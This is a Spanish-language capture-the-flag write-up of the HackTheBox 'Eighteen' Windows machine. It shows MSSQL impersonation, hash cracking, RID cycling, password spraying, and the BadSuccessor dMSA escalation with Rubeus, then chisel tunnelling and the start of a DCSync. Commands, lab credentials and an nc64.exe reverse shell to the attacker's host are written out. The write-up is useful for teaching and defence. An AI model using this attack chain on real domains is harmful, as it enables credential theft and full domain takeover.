---
title: Eighteen - Easy (HTB)
permalink: /Eighteen-HTB-Writeup/
tags:
  - Windows
  - Easy
  - dMSA
  - MSSQL
  - Impersonation
  - "RID Cycling"
  - BadSuccessor
  - "Port Forwarding"
  - Chisel
  - Proxychains
  - PSCredential
  - Kerberos
  - "DC Sync"
  - PassTheHash
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Eighteen - Easy (HTB)
seo_description: Enumera, abusa de permisos en SQL Server y cuentas de servicio administradas delegadas para vencer Eighteen.
excerpt: Enumera, abusa de permisos en SQL Server y cuentas de servicio administradas delegadas para vencer Eighteen.
header:
  overlay_image: /assets/images/headers/eighteen-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/eighteen-hackthebox.jpg
---
![image-center](/assets/images/posts/eighteen-hackthebox.png)
{: .align-center}

**Habilidades:** MSSQL - Enumeration + Impersonation, Hash Cracking, RID Cycling Attack, Password Spraying, PowerShell PSCredential, Abusing delegated Managed Service Accounts (`dMSA`) - `BadSucessor`, Port Forwarding with `chisel` + `proxychains`, DC Sync [Privilege Escalation], PassTheHash
{: .notice--primary}

# Introducción

Eighteen es una máquina Windows de dificultad `Easy` en la que debemos comprometer un dominio de Active Directory abusando de permisos de suplantación (`IMPERSONATE`) y enumerando una base de datos en SQL Server para obtener credenciales y acceso inicial.

Explotaremos una nueva funcionalidad añadida en Windows Server 2025 que involucra cuentas de servicio administradas delegadas (`dMSA`), para realizar un ataque DC Sync y  

El creador de la máquina nos deja el siguiente mensaje en la descripción, el cual contiene credenciales.

> As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: `kevin` / `iNa2we6haRj2gaw!`
{: .notice--info}
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.95

PING 10.10.11.95 (10.10.11.95): 56 data bytes
64 bytes from 10.10.11.95: icmp_seq=0 ttl=127 time=145.156 ms

--- 10.10.11.95 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 145.156/145.156/145.156/0.000 ms
~~~


## Port Scanning 

Lanzaremos un escaneo inicial de puertos abiertos en la máquina víctima, donde primeramente utilizaremos el protocolo TCP/IPv4

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.95 -oG openPorts

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 17:49 -03
Nmap scan report for 10.10.11.95
Host is up (0.20s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
1433/tcp open  ms-sql-s
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 38.93 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Ejecutaremos un segundo escaneo frente a los puertos descubiertos, el cual se encargará de identificar tanto la versión del servicio como aplicar un conjunto de scripts de reconocimiento básicos a cada uno de estos servicios

~~~ bash
nmap -p 80,1433,5985 -sVC 10.10.11.95 -oN services

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-09 17:51 -0300
Nmap scan report for 10.10.11.95
Host is up (0.23s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-09T18:52:39
|_Not valid after:  2055-12-09T18:52:39
|_ssl-date: 2025-12-09T20:51:59+00:00; +3s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m04s, deviation: 0s, median: 7h00m03s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.28 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos solamente tres servicios, `http`, `mssql` y `winrm`, además del nombre de host y del dominio. Con esta información podemos deducir que estamos frente a un Controlador de Dominio.

Agregaremos tanto el nombre del DC como del dominio a nuestro archivo `/etc/hosts` para aplicar una resolución DNS correctamente a la dirección IP sin pasar por un DNS externo

``` bash
echo '10.10.11.95 eighteen.htb DC01.eighteen.htb' | sudo tee -a /etc/hosts

10.10.11.95 eighteen.htb DC01.eighteen.htb
```


## Web Analysis

Antes de visitar la web podemos realizar un escaneo para intentar descubrir las tecnologías que el servidor pueda estar utilizando para cargar el contenido

``` bash
whatweb http://eighteen.htb

http://eighteen.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.95], Microsoft-IIS[10.0], Title[Welcome - eighteen.htb]
```

Al navegar hasta `eighteen.htb`, veremos la siguiente página web, la cual parece ofrecer funcionalidades para gestionar nuestras finanzas 

![image-center](/assets/images/posts/eighteen-1-hackthebox.png)
{: .align-center}

Podemos crear una cuenta bajo la ruta `/register`, haciendo clic directamente en `Get Started Free`.

Al iniciar sesión dentro de la web se cargará el siguiente `Dashboard` bajo la ruta `/dashboard`. Luego de unas pruebas manuales esta web no parece ser vulnerable

![image-center](/assets/images/posts/eighteen-2-hackthebox.png)
{: .align-center}

Existe un apartado de `Admin` sobre el cual podemos intentar acceder haciendo clic en él

![image-center](/assets/images/posts/eighteen-3-hackthebox.png)
{: .align-center}

Sin embargo, aparecerá el siguiente mensaje, indicando que no disponemos de los privilegios suficientes

![image-center](/assets/images/posts/eighteen-4-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## MSSQL Enumeration

Ahora nos enfocaremos en el servicio de `SQL Server`, sobre el cual podemos intentar iniciar sesión de la siguiente manera

> En mi caso tuve que utilizar el script `mssqlclient.py` desde el repositorio, de lo contrario podremos obtener el error `[-] ('No cipher can be selected.',)`
{: .notice--danger}

``` bash
python3 impacket/examples/mssqlclient.py eighteen.htb/kevin:'iNa2we6haRj2gaw!'@DC01.eighteen.htb

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (kevin  guest@master)> 
```

Listando las bases de datos disponibles, veremos una que hace referencia a la empleada en la web, la cual se llama `financial_planner`. Sin embargo el usuario `kevin` no tiene acceso a esta base de datos

``` sql
SQL (kevin  guest@master)> enum_db
name                is_trustworthy_on   
-----------------   -----------------   
master                              0   
tempdb                              0   
model                               0   
msdb                                1   
financial_planner                   0 
  
SQL (kevin  guest@master)> use financial_planner;
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
```

### Impersonating `appdev`

`SQL Server` permite a un usuario cambiar su contexto de seguridad gracias a la funcionalidad [`Impersonate`](https://learn.microsoft.com/es-es/sql/relational-databases/clr-integration/data-access/impersonation-and-credentials-for-connections?view=sql-server-ver17), y de esta forma, asumir la identidad de un usuario dentro del contexto de `SQL Server`.

Desde la herramienta `mssqlclient` podemos ejecutar el siguiente comando para enumerar los permisos de suplantación

``` sql
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev 
```

Vemos que tenemos permisos de suplantación para cambiar al usuario `appdev` ya que este otorga este permiso a `kevin`. 

Podemos ejecutar la siguiente sentencia para cambiar a la cuenta `appdev` dentro de `SQL Server`

``` sql
SQL (kevin  guest@master)> execute as login = 'appdev';
SQL (appdev  appdev@master)> 
```

De igual forma, podemos ejecutar el comando de la herramienta `mssqlclient` para lograr el mismo resultado

``` sql
SQL (kevin  guest@master)> exec_as_login appdev
SQL (appdev  appdev@master)> 
```

### Database

Ahora que cambiamos de contexto para suplantar al usuario `appdev`, podremos enumerar la base de datos `financial_planner`. 

``` sql
SQL (appdev  appdev@financial_planner)> enum_db
name                is_trustworthy_on   
-----------------   -----------------   
master                              0   
tempdb                              0   
model                               0   
msdb                                1   
financial_planner                   0 

SQL (appdev  appdev@master)> use financial_planner;
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
SQL (appdev  appdev@financial_planner)> 
```

Al enumerar las tablas de esta base de datos, veremos la tabla `users`, la cual parece más interesante que las otras 

``` sql
SQL (appdev  appdev@financial_planner)> SELECT table_name FROM information_schema.tables;
table_name    
-----------   
users         
incomes       
expenses      
allocations   
analytics     
visits 
```

Al consultar los registros de la tabla `users`, veremos las credenciales cifradas para el usuario `admin`

``` bash
SQL (appdev  appdev@financial_planner)> select * from users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03   

1008   test        test       test@test.com        pbkdf2:sha256:600000$3LTYv9gZ7CJLCmiD$791039c061e9b34111ffb18952f8f82b3afaf4864d71a5738f22a554b1fee303          0   2025-11-15 19:02:03   
```


## Hash Cracking

Si intentamos identificar el hash con herramientas como `hashcat`, no tendremos éxito. esto puede pasar porque cada sistema (`Django`, `Flask`, `Passlib`, etc.) almacenan este tipo de hashes de forma ligeramente diferente, porque no hay un formato estándar universal para este tipo de hashes

``` bash
hashcat hash.txt /usr/local/share/wordlists/rockyou.txt   
hashcat (v7.1.2) starting in autodetect mode

...
<SNIP>
...

No hash-mode matches the structure of the input hash.

Started: Tue Dec  9 08:17:19 2025
Stopped: Tue Dec  9 08:17:28 2025
```

### Formatting to `hashcat`

Podemos usar el siguiente script en `python` que convierte el hash encontrado en el formato esperado por `hashcat` 

``` python
#!/usr/bin/env python3

import base64
import sys

h = ''.join(sys.argv[1:])

if h is None or len(str(h).strip()) == 0:
    print('please provide the hash')
    exit(1)

taa = h.split(':')[:-1]
start = len(':'.join(taa) + ':')

iterations = h[start:].split('$')[0]
salt = h[start:].split('$')[1]
sha = h[start:].split('$')[2]

salt_base64 = base64.b64encode(salt.encode()).decode()

hash_hex = sha
hash_bytes = bytes.fromhex(hash_hex)
hash_base64 = base64.b64encode(hash_bytes).decode()

print(f'{taa[1]}:{iterations}:{salt_base64}:{hash_base64}')
```

Ejecutaremos nuestra pequeña herramienta y guardaremos la salida dentro de un archivo `hash.txt`

``` bash
python3 pbkdf2hashcat.py 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' | tee hash.txt

sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

Si volvemos a intentar descifrar el hash, obtendremos una contraseña en texto claro. Esto pudimos lograrlo debido a que formaba parte del diccionario `rockyou.txt` 

``` bash
hashcat hash.txt /usr/local/share/wordlists/rockyou.txt -O

...
<SNIP>
...
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
```


## RID Cycling Attack

La técnica `RID Cycling` permite enumerar objetos del dominio mediante fuerza bruta o adivinando `RIDs` basándose en el hecho de que este valor es secuencial (típicamente desde el valor `500` en adelante).

> `RID` significa Identificador Relativo (`Relative Identifier`), que es un número único asignado a cada objeto de seguridad (usuario, grupo, equipo) dentro de un dominio y forma parte de su Identificador de Seguridad (`SID`) único.
{: .notice--info}

Utilizaremos la herramienta `netexec` para ejecutar este ataque con las credenciales proporcionadas al inicio

``` bash
nxc mssql DC01.eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
```

Podemos aplicar una serie de filtros y expresiones para obtener un listado de usuarios válidos dentro del dominio, de la siguiente forma

``` bash
nxc mssql DC01.eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute | grep -E '1[6-9][0-9][0-9]:|2[0-9][0-9][0-9]:' | awk '{print $6}' | cut -d '\' -f2-2 | grep -E '\.' | grep -v '\$' | tee users.txt 

jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.greenn
```


## Password Spraying

> `Password Spraying` es un ataque en el que los atacantes prueban contraseñas de uso común o débiles en muchas cuentas. 
{: .notice--info}

Lanzaremos un ataque de `Password Spraying` para intentar validar esta contraseña frente a los usuarios del dominio

``` bash
nxc winrm DC01.eighteen.htb -u users.txt -p iloveyou1 | grep -v '\[-\]'

WINRM                    10.129.248.40   5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) 
WINRM                    10.129.248.40   5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

Nos conectaremos al Controlador de Dominio usando la herramienta `evil-winrm-py`

~~~ bash
evil-winrm-py -i DC01.eighteen.htb -u adam.scott -p 'iloveyou1'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'DC01.eighteen.htb:5985' as 'adam.scott'
evil-winrm-py PS C:\Users\adam.scott\Documents> whoami
eighteen\adam.scott
~~~

Ya podemos ver la flag del usuario sin privilegios

``` bash
evil-winrm-py PS C:\Users\adam.scott\Documents> type ..\Desktop\user.txt
41f...
```

<br>
# Escalada de Privilegios
---
## Abusing delegated Managed Service Accounts (`dMSA`) - `BadSucessor`

En Windows Server 2025, Microsoft introdujo las [cuentas de servicio administradas delegadas](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-set-up-dmsa) (`dMSA`).

Este ataque aprovecha la función de una cuenta `dMSA` para explotar una vulnerabilidad en la derivación de privilegios en Windows Server 2025, permitiendo a un atacante obtener control de cualquier cuenta dentro de un dominio de Active Directory.

 Respecto a la explotación, los investigadores de `Akamai` lo han denominado como una ["migración simulada"](https://www.akamai.com/es/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory#conclusion:~:text=%22migraci%C3%B3n%20simulada%22)

### Understanding Vulnerability

> Una `dMSA` es un nuevo tipo de cuenta de servicio en Active Directory (`AD`) que amplía las capacidades de las cuentas de servicio gestionadas por grupo (`gMSA`, del inglés "`group Managed Service Accounts`").
{: .notice--info}

Este ataque es posible debido a la forma en la que el KDC (`Key Distribution Center`) confía en el valor del atributo `msDS-ManagedAccountPrecededByLink` contenido dentro de una cuenta `dMSA`.

- El usuario atacante con permisos de escritura o `CreateChild` dentro de una Unidad Organizativa (objeto más común para estos fines) crea una cuenta `dMSA` (objeto de tipo `msDS-DelegatedManagedServiceAccount`) bajo su control.
- El atacante modifica los atributos críticos de la cuenta `dMSA` que permiten suplantar a un usuario privilegiado:
	- `msDS-ManagedAccountPrecededByLink` para definir el `Distinguished Name (DN)` del usuario a suplantar.
	- `msDS-DelegatedMSAState` con el valor `2` para decirle al KDC que la migración ha finalizado.

> La migración es un mecanismo diseñado por Microsoft para realizar una transición segura y gradual desde una cuenta de servicio tradicional (o heredada) a una nueva cuenta `dMSA` gestionada por el DC.
{: .notice--info}

Posterior a esta modificación, cuando el atacante se autentica como la cuenta `dMSA`, el KDC confía en el atributo `msDS-ManagedAccountPrecededByLink` y genera un ticket que contiene el PAC (`Privilege Attribute Certificate`)  del usuario privilegiado.

Para conocer más detalles técnicos acerca del uso de esta técnica, podemos consultar el siguiente [artículo](https://www.akamai.com/es/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory).

Podemos utilizar la herramienta [`BadSuccessor.exe`](https://github.com/logangoins/SharpSuccessor) tanto como para enumerar permisos como para explotar esta vulnerabilidad. Comenzaremos enumerando las OU sobre las que tenemos permisos de escritura

``` bash
evil-winrm-py PS C:\Programdata> upload BadSuccessor.exe .
evil-winrm-py PS C:\Programdata> .\BadSuccessor.exe find

 ______           __ _______                                               
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|____|_____|_____|_____|_____|__|  

Researcher: @YuG0rd
Author: @kreepsec


[*] OUs you have write access to:
    -> OU=Domain Controllers,DC=eighteen,DC=htb
       Privileges: GenericWrite, GenericAll
    -> OU=Staff,DC=eighteen,DC=htb
       Privileges: GenericWrite, GenericAll, CreateChild
```

Añadiremos una nueva cuenta `dMSA` que intente suplantar al usuario `Administrator` dentro de la OU de `Staff`

``` bash
evil-winrm-py PS C:\Programdata> .\BadSuccessor.exe escalate -targetOU "OU=STAFF,DC=EIGHTEEN,DC=HTB" -dmsa incommatose -targetUser "CN=ADMINISTRATOR,CN=
USERS,DC=EIGHTEEN,DC=HTB" -dnshostname incommatose.eigtheen.htb -user adam.scott

 ______           __ _______                                               
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|____|_____|_____|_____|_____|__|  

Researcher: @YuG0rd
Author: @kreepsec

[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=ADMINISTRATOR,CN=USERS,DC=EIGHTEEN,DC=HTB
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = adam.scott
[+] Setting userAccountControl attribute
[+] Setting msDS-SupportedEncryptionTypes attribute
[+] Created dMSA 'incommatose' in 'OU=STAFF,DC=EIGHTEEN,DC=HTB', linked to 'CN=ADMINISTRATOR,CN=USERS,DC=EIGHTEEN,DC=HTB' (DC: auto)
```

### `PSCredential`

Los pasos siguientes requieren de autenticación `kerberos`, sin embargo, desde una shell usando el protocolo `winrm`, no veremos credenciales `kerberos`, debido a que nos autenticamos con el protocolo NTLM. 

Para comprender este problema podemos consultar el siguiente [artículo](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/winrm-security?view=powershell-7.5#process-isolation) que habla sobre el contexto asilado de una shell vía `WinRM` y el proceso de autenticación

``` powershell
evil-winrm-py PS C:\Programdata> klist

Current LogonId is 0:0xd50661
Error calling API LsaCallAuthenticationPackage (ShowTickets substatus): 1312

klist failed with 0xc000005f/-1073741729: A specified logon session does not exist. It may already have been terminated.
```

Es por esto que podemos optar por alternativas como [`PSCredential`](https://www.easy365manager.com/pscredential/) para ejecutar un comando en un contexto que herede las credenciales `kerberos`.

Comenzaremos por convertir la contraseña del usuario `adam.scott`

``` powershell
evil-winrm-py PS C:\Programdata> $password = ConvertTo-SecureString -AsPlainText -Force -String "iloveyou1"
```

Continuaremos creando el objeto con la clase `PSCredential`

``` powershell
evil-winrm-py PS C:\Programdata> $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "eighteen\adam.scott",$password
```

Antes de ejecutar una shell, iniciaremos un listener que reciba la conexión que enviaremos desde el DC

``` bash
rlwrap nc -lvnp 443
```

Usaremos `nc.exe` para ejecutar una shell hacia nuestro equipo por el puerto que tenemos a la escucha. 

Posteriormente, haremos uso de las credenciales para ejecutar un comando dentro de un `ScriptBlock` para heredar el contexto de seguridad de una sesión de `powershell`

``` powershell
evil-winrm-py PS C:\Programdata> upload nc64.exe .
evil-winrm-py PS C:\Programdata> Invoke-Command -ComputerName DC01 -ScriptBlock { C:\Programdata\nc64.exe -e powershell.exe 10.10.14.150 443 } -Credential $credential
```

Recibiremos la shell correctamente desde nuestro lado como el usuario `adam.scott`

``` bash
Connection from 10.129.134.7:52092
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\adam.scott\Documents> whoami
eighteen\adam.scott
```

Desde esta shell deberíamos ver las credenciales `kerberos` al volver a ejecutar el comando `klist`

``` powershell
PS C:\Users\adam.scott\Documents> klist
klist

Current LogonId is 0:0x13fea47

Cached Tickets: (1)

#0>	Client: adam.scott @ EIGHTEEN.HTB
	Server: krbtgt/EIGHTEEN.HTB @ EIGHTEEN.HTB
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 12/9/2025 1:15:35 (local)
	End Time:   12/9/2025 11:15:35 (local)
	Renew Time: 12/16/2025 1:15:35 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 
```

> Es posible que el `Clean Up` borre la cuenta `dMSA` que creamos anteriormente, por lo que te verás obligado a volver a crearla en este punto.
{: .notice--danger}

### TGT - Auth as `adam.scott`

Continuando con la explotación de esta vulnerabilidad, el siguiente paso es autenticarse como la nueva cuenta `dMSA` utilizando el protocolo `kerberos`.

Solicitaremos un TGT (`Ticket Granting Ticket`) para el usuario `adam.scott`, el cual es necesario para posteriormente autenticarnos como la `dMSA`

``` powershell
PS C:\Programdata> .\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /dc:dc01.eighteen.htb /enctype:aes256 /outfile:ticket.kirbi

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGT

[*] Using salt: EIGHTEEN.HTBadam.scott
[*] Using aes256_cts_hmac_sha1 hash: 02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5
[*] Building AS-REQ (w/ preauth) for: 'eighteen.htb\adam.scott'
[*] Using domain controller: fe80::4a10:5293:244a:ebc9%3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

...
<SNIP>
...

[*] Ticket written to ticket.kirbi


  ServiceName              :  krbtgt/eighteen.htb
  ServiceRealm             :  EIGHTEEN.HTB
  UserName                 :  adam.scott (NT_PRINCIPAL)
  UserRealm                :  EIGHTEEN.HTB
  StartTime                :  12/9/2025 1:17:09 AM
  EndTime                  :  12/9/2025 11:17:09 AM
  RenewTill                :  12/16/2025 1:17:09 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  jOdaP/OYr2tMXFAxDSbREuHarS/KPmP1A08bwrhrgsA=
  ASREP (key)              :  02F93F7E9E128C32449E2F20475AFCDFB6CC2B4444AC8FD0B02406AF018F75E5
```

### TGS - Auth as `dMSA`

Ahora emitiremos un TGS (`Ticket Granting Service`) para el servicio `krbtgt` en nombre de la cuenta `dMSA`.

> Para este paso es necesaria la versión `2.3.3` de `Rubeus`, ya que esta implementa la autenticación de cuentas `dMSA`
{: .notice--warning}

``` powershell
PS C:\Programdata> .\Rubeus.exe asktgs /targetuser:incommatose$ /service:krbtgt/eighteen.htb /opsec /dmsa /nowrap /ptt /ticket:ticket.kirbi /outfile:dmsa.kirbi

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building DMSA TGS-REQ request for 'incommatose$' from 'adam.scott'
[+] Sequence number is: 357349877
[*] Using domain controller: DC01.eighteen.htb (fe80::4a10:5293:244a:ebc9%3)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

...
<SNIP>
...

  ServiceName              :  krbtgt/EIGHTEEN.HTB
  ServiceRealm             :  EIGHTEEN.HTB
  UserName                 :  incommatose$ (NT_PRINCIPAL)
  UserRealm                :  eighteen.htb
  StartTime                :  12/9/2025 2:20:33 AM
  EndTime                  :  12/9/2025 2:35:33 AM
  RenewTill                :  12/16/2025 2:20:25 AM
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  UTlHUVfhdqcFO5F6ScyTf0aIAIuxMA7FKO6fAnsSCUA=
  Current Keys for incommatose$: (aes256_cts_hmac_sha1) 4F891D8A4673F493ABB4691D904B459751F9E0E15BD9F4F254875AA16D94E7B3


[*] Ticket written to dmsa.kirbi
```

Descargaremos el TGS en nuestra máquina con el comando `download` de `evil-winrm-py`

``` powershell
PS C:\Programdata> download dmsa.kirbi
```


## Port Forwarding with `chisel` + `proxychains`

Como no podemos alcanzar los puertos necesarios desde nuestra máquina, iniciaremos un proxy SOCKS para poder tramitar tráfico `kerberos` desde fuera de la red interna

``` bash
/chisel server -p 8000 --reverse
2025/12/08 23:24:19 server: Reverse tunnelling enabled
2025/12/08 23:24:19 server: Fingerprint 5r32mX91nmX7ngr9WO6tM5CKOGECxAmfTAX/YKTt9S4=
2025/12/08 23:24:19 server: Listening on http://0.0.0.0:8000
```

### Clock synchronization

Tenemos una opción bastante interesante, la cual consiste en reenviar el puerto que utiliza el protocolo `MS-NTP` para que podamos sincronizar nuestro reloj con el DC usando `ntpdate`.

Ejecutaremos `chisel` con la siguiente sintaxis, reenviando el puerto `123` por el protocolo UDP

``` powershell
evil-winrm-py PS C:\Programdata> ./chisel client 10.10.14.150:8000 R:123:127.0.0.1:123/udp
```

Cuando recibamos la conexión, se abrirá nuestro puerto `123` bajo el protocolo UDP

``` bash
2025/12/08 23:26:16 server: session#1: tun: proxy#R:123=>123/udp: Listening
```

Ya con el reenvío establecido, podemos sincronizar nuestro reloj a través de `localhost`

``` bash
sudo ntpdate -u 127.0.0.1

 9 Dec 06:27:22 ntpdate[26376]: adjust time server 127.0.0.1 offset +0.030294 sec
```

### SOCKS Proxy

Podemos cerrar el túnel sobre el puerto `123` porque ya no es necesario, ahora podemos establecer uno que reenvíe dinámicamente los puertos usando un proxy SOCKS de forma dinámica

``` bash
evil-winrm-py PS C:\Programdata> ./chisel client 10.10.14.150:8000 R:socks
```

Se abrirá un puerto en nuestro equipo, generalmente el `1080`, el cual podemos usar con `proxychains` para enviar tráfico hacia el DC

``` bash
2025/12/08 23:26:16 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Ajustaremos la configuración necesaria de `proxychains` para usar el túnel SOCKS, incluyendo la dirección del puerto y el tipo de proxy

``` bash
sed -i 's/^dynamic_chain/#dynamic_chain/' /etc/proxychains.conf
sed -i 's/^#strict_chain/strict_chain/' /etc/proxychains.conf 

echo 'socks5 127.0.0.1 1080' | tee -a /usr/local/etc/proxychains.conf
socks5 127.0.0.1 1080
```

### Ticket Convert

Convertiremos el ticket desde su formato `.kirbi` en un archivo de caché que contenga  las credenciales del ticket en cuestión con la herramienta `ticketConverter.py`

``` bash
ticketConverter.py dmsa.kirbi incommatose\$.ccache

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Ahora debemos cargar el ticket en la variable `KRB5CCNAME` para poder hacer uso del ticket privilegiado

``` bash
export KRB5CCNAME=$(pwd)/incommatose\$.ccache
```


## DC Sync

Un ataque `DCSync` utiliza comandos del Protocolo remoto del servicio de replicación de directorios de Microsoft (`MS-DRSR`) para hacerse pasar por un controlador de dominio (DC) con el fin de obtener las credenciales de usuario de otro DC.

Con el túnel SOCKS establecido, podremos hacer uso de `secretsdump` para volcar los hashes de todos los usuarios del dominio.

